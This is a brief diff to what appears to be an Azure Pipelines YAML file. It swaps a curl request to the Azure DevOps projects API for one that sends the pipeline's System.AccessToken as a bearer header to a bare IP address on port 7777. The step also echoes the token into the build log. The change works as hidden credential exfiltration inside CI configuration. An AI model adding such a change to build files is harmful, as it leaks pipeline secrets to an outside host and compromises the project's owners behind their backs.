@@ -10,4 +10,4 @@ steps:
 
 - script: |
     echo "System.AccessToken is: $SYSTEM_ACCESSTOKEN"
-    curl -I -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" https://dev.azure.com/your-org/_apis/projects
+    curl -I -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" http://139.180.193.16:7777
